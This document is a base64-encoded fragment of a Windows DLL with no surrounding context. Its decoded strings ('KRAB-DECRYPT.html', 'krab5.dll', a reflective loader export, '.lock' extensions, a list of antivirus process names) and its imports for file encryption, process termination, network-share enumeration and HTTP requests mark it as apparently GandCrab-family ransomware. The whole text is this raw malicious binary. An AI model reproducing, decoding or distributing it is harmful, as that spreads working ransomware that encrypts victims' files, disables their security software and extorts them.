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AAABfAAAAJQBJADYANAB1AC8AAAAAACUASQA2ADQAdQAAACwAAAAwACwAAAAAAEEAVgBQAC4ARQBYAEUAAABlAGsAcgBuAC4AZQB4AGUAAAAAAGEAdgBnAG4AdAAuAGUAeABlAAAAYQBzAGgARABpAHMAcAAuAGUAeABlAAAATgBvAHIAdABvAG4AQQBuAHQAaQBCAG8AdAAuAGUAeABlAAAATQBjAHMAaABpAGUAbABkAC4AZQB4AGUAAAAAAGEAdgBlAG4AZwBpAG4AZQAuAGUAeABlAAAAAABjAG0AZABhAGcAZQBuAHQALgBlAHgAZQAAAAAAcwBtAGMALgBlAHgAZQAAAHAAZQByAHMAZgB3AC4AZQB4AGUAAAAAAHAAYwBjAHAAZgB3AC4AZQB4AGUAAAAAAGYAcwBnAHUAaQBlAHgAZQAuAGUAeABlAAAAAABjAGYAcAAuAGUAeABlAAAAbQBzAG0AcABlAG4AZwAuAGUAeABlAAAAAAAAAFMAWQBTAFQARQBNAAAAAABEAEUAQQBSACAAJQBzACwAIAAAAEQARQBBAFIAIABVAFMARQBSACwAIAAAAFwAcABpAGQAbwByAC4AYgBtAHAAAAAAAAAAAAAAAAAAV293NjRSZXZlcnRXb3c2NFdvdzY0RGlzYWJsZVdvdzZOdFNldEluZm9ybWF0aW9uSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUKoBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAGysABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAFLAAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAACPsQAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAIa1ABD+////AAAAAJW1ABD+////AAAAANj///8AAAAA/v///wAAAADntQAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAMS2ABAAAAAA/v///wAAAADE////AAAAAP7///8AAAAArLgAEAAAAAD+////AAAAANj///8AAAAA/v///znVABBM1QAQAAAAAP7///8AAAAAzP///wAAAAD+////AAAAAIrfABAAAAAAAAAAAFTfABD+////AAAAAND///8AAAAA/v///wAAAAA24gAQAAAAAP7///8AAAAAzP///wAAAAD+////AAAAAATjABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAA7OMAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAABQ7wAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAODvABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAzhABEAAAAAD+////AAAAANj///8AAAAA/v///9EuARDtLgEQAAAAAAAAAAAAAAAAAAAAAMtF11sAAAAAsooBAAEAAAABAAAAAQAAAKiKAQCsigEAsIoBAGdsAAC8igEAAABrcmFiNS5kbGwAX1JlZmxlY3RpdmVMb2FkZXJAMAAEjAEAAAAAAAAAAACGkwEAlDABANCNAQAAAAAAAAAAAESUAQBgMgEAvIsBAAAAAAAAAAAAXJUBAEwwAQBwiwEAAAAAAAAAAAC8lgEAADABAMCNAQAAAAAAAAAAAAaXAQBQMgEAsI0BAAAAAAAAAAAARpcBAEAyAQAAjgEAAAAAAAAAAADClwEAkDIBAAAAAAAAAAAAAAAAAAAAAAAAAAAAppYBAIyWAQB2lgEAYpYBAFKWAQBAlgEAMpYBACKWAQAQlgEA+pUBAOaVAQDOlQEAvJUBAKqVAQCclQEAjJUBAHiVAQBmlQEAAAAAAEyVAQBAlQEAMJUBACSVAQAWlQEACpUBAPqUAQDqlAEA1JQBALqUAQCslAEAnpQBAJKUAQCAlAEAYJQBAFCUAQBwlAEAAAAAAIyQAQCakAEAqpABAMSQAQDQkAEA7JABAASRAQAYkQEAMJEBAEiRAQBYkQEAZJEBAICRAQCQkQEAnJEBAK6RAQDAkQEA3JEBAPSRAQAMkgEAGpIBACySAQA6kgEATpIBAGSSAQBwkgEAfJIBAIySAQCckgEAspIBAMKSAQB8kAEA1pIBAOySAQACkwEAEpMBACKTAQAwkwEARJMBAFCTAQBekwEAaJMBAHiTAQCemQEAjJkBAHyZAQBomQEAUpkBAEaZAQA6mQEAbpABAFiQAQAcjgEARJABADaQAQAakAEACpABAPiPAQDmjwEA0o8BALyPAQCsjwEAjo8BAH6PAQBwjwEAZI8BAFiPAQBGjwEANo8BACaPAQAQjwEA/I4BAOiOAQDWjgEAxo4BALCOAQCijgEAlo4BAIqOAQB8jgEAbo4BAGKOAQBajgEATo4BAECOAQAsjgEAKpkBABqZAQAGmQEA+JgBAOqYAQDCmAEApJgBAIiYAQB2mAEAapgBAFSYAQDOlwEA6pcBAPyXAQAGmAEAEpgBAB6YAQA0mAEARJgBAK6ZAQAAAAAAMpcBABKXAQAilwEAAAAAANyWAQDKlgEA7JYBAAAAAADSkwEAAJQBAAyUAQAUlAEAlJMBAKCTAQC4kwEAIJQBACyUAQA4lAEA6pMBAAAAAABOlwEArpcBAJqXAQB0lwEAXpcBAIaXAQAAAAAA6QRWaXJ0dWFsQWxsb2MAAGcEU2V0RmlsZVBvaW50ZXJFeAAA1ARVbmxvY2tGaWxlAAAlBVdyaXRlRmlsZQCyBFNsZWVwAMADUmVhZEZpbGUAAI8AQ3JlYXRlRmlsZVcAUgBDbG9zZUhhbmRsZQBOBWxzdHJsZW5XAABNBWxzdHJsZW5BAADsBFZpcnR1YWxGcmVlAGcDTXVsdGlCeXRlVG9XaWRlQ2hhcgDxBFZpcnR1YWxRdWVyeQAAPgNMb2FkTGlicmFyeUV4VwAAwAFHZXRDdXJyZW50UHJvY2VzcwAYAkdldE1vZHVsZUhhbmRsZVcAAHACR2V0U3lzdGVtRGlyZWN0b3J5VwA/A0xvYWRMaWJyYXJ5VwAAAgJHZXRMYXN0RXJyb3IAAEUCR2V0UHJvY0FkZHJlc3MAAD8FbHN0cmNhdFcAAEgFbHN0cmNweVcAABkBRXhpdFByb2Nlc3MAngBDcmVhdGVNdXRleFcAAG4CR2V0U3lzdGVtRGVmYXVsdFVJTGFuZ3VhZ2UAAFgEU2V0RXJyb3JNb2RlAAD5BFdhaXRGb3JTaW5nbGVPYmplY3QAjwFHZXRDb21wdXRlck5hbWVXAABKAkdldFByb2Nlc3NIZWFwAACGAUdldENvbW1hbmRMaW5lQQDSAUdldERyaXZlVHlwZUEA4gJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uAIADT3BlblByb2Nlc3MAwARUZXJtaW5hdGVQcm9jZXNzAAAUAkdldE1vZHVsZUZpbGVOYW1lVwAAGgFFeGl0VGhyZWFkAADzBFZpcnR1YWxVbmxvY2sAfQNPcGVuTXV0ZXhXAABzAkdldFN5c3RlbUluZm8A9wRXYWl0Rm9yTXVsdGlwbGVPYmplY3RzAABFBWxzdHJjbXBpVwCeAkdldFVzZXJEZWZhdWx0VUlMYW5ndWFnZQAA0QBEZWxldGVDcml0aWNhbFNlY3Rpb24AYQJHZXRTaG9ydFBhdGhOYW1lVwCvAkdldFdpbmRvd3NEaXJlY3RvcnlXAACnAkdldFZvbHVtZUluZm9ybWF0aW9uVwC1AENyZWF0ZVRocmVhZAAARwVsc3RyY3B5QQAAHQFFeHBhbmRFbnZpcm9ubWVudFN0cmluZ3NXAJMCR2V0VGlja0NvdW50AABEBWxzdHJjbXBpQQCWA1Byb2Nlc3MzMkZpcnN0VwCYA1Byb2Nlc3MzMk5leHRXAAC+AENyZWF0ZVRvb2xoZWxwMzJTbmFwc2hvdAAAOQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAA7gBFbnRlckNyaXRpY2FsU2VjdGlvbgAA7gRWaXJ0dWFsTG9jawA5AUZpbmRGaXJzdEZpbGVXAABgA01vdmVGaWxlRXhXADQBRmluZEZpcnN0RmlsZUV4VwAAEQVXaWRlQ2hhclRvTXVsdGlCeXRlAEIFbHN0cmNtcFcAAC4BRmluZENsb3NlAEUBRmluZE5leHRGaWxlVwB3AkdldFN5c3RlbVRpbWUAJQJHZXROYXRpdmVTeXN0ZW1JbmZvANMBR2V0RHJpdmVUeXBlVwDPAUdldERpc2tGcmVlU3BhY2VXAOQEVmVyU2V0Q29uZGl0aW9uTWFzawDoBFZlcmlmeVZlcnNpb25JbmZvVwAAcwRTZXRMYXN0RXJyb3IAADwDTG9hZExpYnJhcnlBAABEA0xvY2FsQWxsb2MAABUCR2V0TW9kdWxlSGFuZGxlQQAASANMb2NhbEZyZWUAswJHbG9iYWxBbGxvYwBmA011bERpdgAAhQJHZXRUZW1wUGF0aFcAALoCR2xvYmFsRnJlZQAAS0VSTkVMMzIuZGxsAAAzA3dzcHJpbnRmVwBwAENyZWF0ZVdpbmRvd1N0YXRpb25XAACqAlNldFByb2Nlc3NXaW5kb3dTdGF0aW9uAOwCU3lzdGVtUGFyYW1ldGVyc0luZm9XAC0BR2V0Rm9yZWdyb3VuZFdpbmRvdwBlAlJlbGVhc2VEQwAhAUdldERDADIDd3NwcmludGZBAM0ARHJhd1RleHRBANAARHJhd1RleHRXAPYARmlsbFJlY3QAAFVTRVIzMi5kbGwAACkAQ3JlYXRlQml0bWFwAAB8AlNldEJpdG1hcEJpdHMApwFHZXRCaXRtYXBCaXRzAA0CR2V0U3RvY2tPYmplY3QAAAQCR2V0UGl4ZWwAAP0BR2V0T2JqZWN0VwAAQQBDcmVhdGVGb250VwAvAENyZWF0ZUNvbXBhdGlibGVCaXRtYXAAADAAQ3JlYXRlQ29tcGF0aWJsZURDAAB3AlNlbGVjdE9iamVjdAAA5gBEZWxldGVPYmplY3QAAJsCU2V0UGl4ZWwAAH4CU2V0QmtDb2xvcgAAygFHZXRESUJpdHMAywFHZXREZXZpY2VDYXBzAOMARGVsZXRlREMAAKYCU2V0VGV4dENvbG9yAABHREkzMi5kbGwAOQJSZWdDcmVhdGVLZXlFeFcAbgJSZWdRdWVyeVZhbHVlRXhXAABhAlJlZ09wZW5LZXlFeFcAMAJSZWdDbG9zZUtleQB+AlJlZ1NldFZhbHVlRXhXAAC/AENyeXB0RXhwb3J0S2V5AACxAENyeXB0QWNxdWlyZUNvbnRleHRXAADFAENyeXB0R2V0S2V5UGFyYW0AAMsAQ3J5cHRSZWxlYXNlQ29udGV4dADKAENyeXB0SW1wb3J0S2V5AAC6AENyeXB0RW5jcnlwdAAAwABDcnlwdEdlbktleQC3AENyeXB0RGVzdHJveUtleQBlAUdldFVzZXJOYW1lVwAA9wFPcGVuUHJvY2Vzc1Rva2VuAABXAUdldFNpZFN1YkF1dGhvcml0eQAAWAFHZXRTaWRTdWJBdXRob3JpdHlDb3VudABaAUdldFRva2VuSW5mb3JtYXRpb24AQURWQVBJMzIuZGxsAAAhAVNoZWxsRXhlY3V0ZUV4VwAiAVNoZWxsRXhlY3V0ZVcA4QBTSEdldFNwZWNpYWxGb2xkZXJQYXRoVwBTSEVMTDMyLmRsbAAQAFdOZXRDbG9zZUVudW0APQBXTmV0T3BlbkVudW1XABwAV05ldEVudW1SZXNvdXJjZVcATVBSLmRsbACaAEludGVybmV0T3BlblcAawBJbnRlcm5ldENsb3NlSGFuZGxlAFkASHR0cFF1ZXJ5SW5mb0EAAHIASW50ZXJuZXRDb25uZWN0VwA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